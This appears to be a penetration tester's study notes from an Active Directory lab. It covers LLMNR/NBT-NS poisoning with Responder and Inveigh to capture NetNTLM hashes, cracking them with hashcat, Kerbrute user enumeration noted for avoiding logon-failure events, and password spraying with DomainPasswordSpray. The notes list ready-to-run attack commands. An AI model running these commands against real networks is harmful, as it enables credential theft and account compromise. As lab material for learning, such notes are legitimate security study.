alternate methods of host identification when DNS fails
1. LLMNR - Link-Local Multicast Name Resolution - port 5355 over UDP
2. NBT-NS - NetBIOS Name Service - port 137 over UDP
it will ask hosts from the network, and ANY host on the network can reply and then we can use responder to poison these requests and spoof an authoritative name resolution source. Then we can try to capture the NetNTLM hash when they are trying to authenticate. 

# Linux 

## responder
if there is something that says "Skipping previously captured hash for InLANEFREIGHT\AB920"
hashes are stored in /usr/share/responder/logs

make sure to run with sudo/root and theses ports are open: 
```shell-session
UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
```

```bash
sudo responder -I ens224 
```

then crack the hashes using [[hashcat]] -m 5600 


# Windows
use Inveigh in PS as administrator
```
Import-Module .\Inveigh.ps1

(Get-Command Invoke-Inveigh).Parameters

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```
there is also a C# version compiled into EXE 
```
.\Inveigh.exe
```
press `esc` and `HELP` to get commands to execute
```
GET NTLMV2UNIQUE
```


We can try a password attacks using the domain's password policy and also do domain user enumeration to make a target user  list [[Password Policy & Spraying]]

## Enumerating Users with Kerbrute 
uses Kerberos Pre-Authentication, which is much faster and potentially stealthier way to perform password spraying. Does not generate Windows event ID 4625: An account failed to log on, or a logon failure which is often monitored for when enumerating users. But when using that users list to do password spraying, a failed attempt will generate the logon failure windows event.

```shell-session
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

then we can do some password spraying with crackmapexec on smb 

# Windows
from windows attack 

if the host is domain joined
[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

if not,
we can also use kerbrute for user enumeration 